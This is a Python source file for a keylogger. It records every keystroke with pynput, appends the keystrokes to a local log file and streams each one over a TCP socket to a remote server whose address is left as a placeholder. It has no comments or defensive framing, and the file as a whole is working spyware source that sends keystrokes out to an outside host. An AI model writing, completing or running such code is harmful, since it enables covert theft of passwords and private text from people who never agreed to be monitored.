import socket
from pynput.keyboard import Listener
from cryptography.fernet import Fernet

with open("secret.key", "rb") as keyFile:
    key = keyFile.read()

cipherSuite = Fernet(key)
serverIP = "Your server IP here"
serverPort = 12345
bufferSize = 1024

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect((serverIP, serverPort))


def writeToFile(key):
    keyStroke = str(key)
    keyStroke = keyStroke.replace("'","")

    if keyStroke == "Key.space":
        keyStroke = " "
    elif keyStroke == "Key.shift":
        keyStroke = ""
    elif keyStroke == "Key.ctrl_l":
        keyStroke = ""
    elif keyStroke == "Key.alt_l":
        keyStroke = ""
    elif keyStroke == "Key.tab":
        keyStroke = "   "
    elif keyStroke == "Key.enter":
        keyStroke = "\n"
    

    with open("Keystroke Log.txt", "a") as fileHandling:
        fileHandling.write(keyStroke)

    sendToServer(keyStroke)



def sendToServer(key):
    keyStroke = str(key)
    keyStroke = keyStroke.replace("'", "")



    clientSocket.send(keyStroke.encode())
    


with Listener(on_press=writeToFile) as listener:
    listener.join()


clientSocket.close()